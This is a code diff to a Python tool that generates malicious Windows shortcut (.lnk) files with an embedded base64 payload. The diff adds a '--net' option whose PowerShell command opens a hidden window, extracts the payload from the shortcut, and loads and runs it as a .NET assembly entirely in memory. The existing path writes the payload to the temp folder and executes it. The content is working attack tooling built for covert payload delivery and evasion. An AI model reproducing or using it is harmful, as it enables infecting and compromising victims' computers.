@@ -23,6 +23,10 @@ def init_args():
     parser.add_argument('-e', '--extra',
                         help='Any powershell commands to run after the base payload')
 
+    parser.add_argument('-n', '--net',
+                        help='Execute the .NET payload fully in memory',
+                        action='store_true')
+
     return parser.parse_args()
 
 
@@ -32,8 +36,13 @@ if __name__ == '__main__':
     if not filename.endswith('.lnk'):
         filename = filename + '.lnk'
     print('[+] Generating command')
-    BASE = '''$b64 = @(Select-String -Pattern "aDuck" -Path .\{}).Line -replace 'aDuck';Set-Content $env:temp\{} -Encoding Byte -Value @([System.Convert]::FromBase64String($b64)); invoke-item $env:temp\{}'''
-    command: str = BASE.format(filename, args.temp, args.temp)
+    if args.net:
+        BASE = '''start-process powershell -ArgumentList "-WindowStyle hidden -c `"`$b64 = @(Select-String -Pattern `"aDuck`" -Path .\{}).Line -replace 'aDuck';`$bytes = [System.Convert]::FromBase64String(`$b64);`$assembly = [System.Reflection.Assembly]::Load(`$bytes);`$assembly.EntryPoint.Invoke(`$null, @(`$null));`""'''
+        command: str = BASE.format(filename)
+        print(command)
+    else:
+        BASE = '''$b64 = @(Select-String -Pattern "aDuck" -Path .\{}).Line -replace 'aDuck';Set-Content $env:temp\{} -Encoding Byte -Value @([System.Convert]::FromBase64String($b64)); invoke-item $env:temp\{}'''
+        command: str = BASE.format(filename, args.temp, args.temp)
     if args.extra:
         command += f'; {args.extra}'
     # print(command)
